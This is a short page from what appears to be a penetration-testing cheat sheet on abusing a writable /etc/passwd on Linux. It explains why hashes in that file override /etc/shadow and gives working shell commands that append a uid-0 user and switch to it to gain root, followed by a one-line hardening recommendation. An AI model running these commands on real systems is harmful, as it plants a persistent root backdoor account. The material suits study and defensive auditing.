---
layout: default
title: Passwd Abuse
parent: Linux
nav_order: 5
permalink: /linux/passwd/
---

# Passwd Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in /etc/shadow, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file /etc/passwd. For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow, if available. This means that if we can write into /etc/passwd, we can effectively set an arbitrary password for any account.

## Prerequisites

- Write permission on `/etc/passwd` on Linux target.

## Exploit

THe goal of this exploit is to add a new superuser on the targeted system. First, you need to encrypt the password for this user before adding it in `/etc/passwd`.

```bash
# Encrypt the password with openssl
ENCRYPTED=$(openssl passwd $PASSWORD)

# Add the new superuser
echo "$USERNAME:$ENCRYPTED:0:0:root:/root:/bin/bash" >> /etc/passwd

# Escalate your privileges with the new superuser
su $USERNAME

# Check you're root
id
```

## Recommendations

- [ ] Set appropriate permissions on `/etc/passwd` file to prevent any illegitimate change.